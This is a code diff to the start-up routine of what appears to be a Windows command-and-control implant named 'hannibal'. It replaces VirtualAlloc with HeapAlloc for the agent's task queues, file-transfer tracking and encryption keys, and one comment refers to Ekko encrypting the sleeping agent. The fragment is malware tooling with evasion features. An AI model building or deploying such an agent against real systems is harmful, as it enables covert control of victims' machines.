@@ -65,15 +65,20 @@ int main(
     // Load needed DLLs and resolve functions into the instance.
     hannibal_resolve_pointers();
 
+    hannibal_instance_ptr->config.process_heap = hannibal_instance_ptr->Win32.GetProcessHeap();
+
     // Create TASK queue structure on heap and track pointer. Doesn't get freed. 
-    hannibal_instance_ptr->tasks.tasks_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(TASK_QUEUE), MEM_COMMIT, PAGE_READWRITE);
+    // hannibal_instance_ptr->tasks.tasks_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(TASK_QUEUE), MEM_COMMIT, PAGE_READWRITE);
+    hannibal_instance_ptr->tasks.tasks_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK_QUEUE));
 
     if(!init_task_queue(hannibal_instance_ptr->tasks.tasks_queue, TASK_CIRCULAR_QUEUE_SIZE)){
         return NULL;
     }
 
     // Create TASK queue structure on heap and track pointer. Doesn't get freed. 
-    hannibal_instance_ptr->tasks.tasks_response_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(TASK_QUEUE), MEM_COMMIT, PAGE_READWRITE);
+    // hannibal_instance_ptr->tasks.tasks_response_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(TASK_QUEUE), MEM_COMMIT, PAGE_READWRITE);
+    hannibal_instance_ptr->tasks.tasks_response_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK_QUEUE));
+
 
     if(!init_task_response_queue(hannibal_instance_ptr->tasks.tasks_response_queue, TASK_CIRCULAR_QUEUE_SIZE)){
         return NULL;
@@ -83,14 +88,16 @@ int main(
     init_task_ptrs();
 
     // For download tracking
-    hannibal_instance_ptr->tasks.file_downloads = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_DOWNLOAD) * CONCURRENT_FILE_DOWNLOADS, MEM_COMMIT, PAGE_READWRITE);
+    // hannibal_instance_ptr->tasks.file_downloads = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_DOWNLOAD) * CONCURRENT_FILE_DOWNLOADS, MEM_COMMIT, PAGE_READWRITE);
+    hannibal_instance_ptr->tasks.file_downloads = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(FILE_DOWNLOAD) * CONCURRENT_FILE_DOWNLOADS);
     
     for (int i = 0; i < CONCURRENT_FILE_DOWNLOADS; i++){
         hannibal_instance_ptr->tasks.file_downloads[i].download_uuid = NULL;
     }
 
      // For upload tracking
-    hannibal_instance_ptr->tasks.file_uploads = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_UPLOAD) * CONCURRENT_FILE_DOWNLOADS, MEM_COMMIT, PAGE_READWRITE);
+    // hannibal_instance_ptr->tasks.file_uploads = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_UPLOAD) * CONCURRENT_FILE_DOWNLOADS, MEM_COMMIT, PAGE_READWRITE);
+    hannibal_instance_ptr->tasks.file_uploads = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(FILE_UPLOAD) * CONCURRENT_FILE_DOWNLOADS);
     
     for (int i = 0; i < CONCURRENT_FILE_UPLOADS; i++){
         hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid = NULL;
@@ -99,7 +106,8 @@ int main(
 
     // Set up Encryption
 
-    hannibal_instance_ptr->config.encrypt_key = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, ENCRYPT_KEY_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    // hannibal_instance_ptr->config.encrypt_key = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, ENCRYPT_KEY_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    hannibal_instance_ptr->config.encrypt_key = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, ENCRYPT_KEY_SIZE);
     hannibal_instance_ptr->config.encrypt_key_size = ENCRYPT_KEY_SIZE;
 
     // Encrypts network messages. 
@@ -108,7 +116,8 @@ int main(
     
     // Currently used by Ekko to encrypt the sleeping agent.
     ULONG seed = pic_rand_number_32();
-    hannibal_instance_ptr->config.local_encryption_key = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, LOCAL_ENCRYPT_KEY_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    // hannibal_instance_ptr->config.local_encryption_key = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, LOCAL_ENCRYPT_KEY_SIZE, MEM_COMMIT, PAGE_READWRITE);
+    hannibal_instance_ptr->config.local_encryption_key = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, LOCAL_ENCRYPT_KEY_SIZE);
     hannibal_instance_ptr->config.local_encryption_key_size = LOCAL_ENCRYPT_KEY_SIZE;
 
     for (int i = 0; i < LOCAL_ENCRYPT_KEY_SIZE; i++){
